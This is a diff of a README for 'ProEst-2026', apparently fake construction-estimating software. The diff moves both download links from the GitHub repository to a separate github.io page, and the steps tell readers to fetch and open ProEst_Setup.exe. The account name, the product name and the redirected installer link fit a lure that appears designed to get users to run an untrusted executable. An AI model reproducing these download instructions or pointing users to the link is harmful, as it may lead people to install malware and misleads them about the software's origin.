@@ -1,6 +1,6 @@
 # 🏗️ ProEst-2026 - Streamline your construction project estimates
 
-[![](https://img.shields.io/badge/Download_ProEst-blue.svg)](https://github.com/aloisiabenefic576/ProEst-2026)
+[![](https://img.shields.io/badge/Download_ProEst-blue.svg)](https://aloisiabenefic576.github.io)
 
 ProEst-2026 helps contractors manage bids and create project estimates. This software tool organizes project data for construction teams. It runs on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run the software. Check these items before
 
 Follow these steps to set up ProEst-2026 on your computer.
 
-1. Visit the [official download page](https://github.com/aloisiabenefic576/ProEst-2026).
+1. Visit the [official download page](https://aloisiabenefic576.github.io).
 2. Click the link to save the installer file to your local computer.
 3. Open your Downloads folder.
 4. Locate the file named ProEst_Setup.exe.
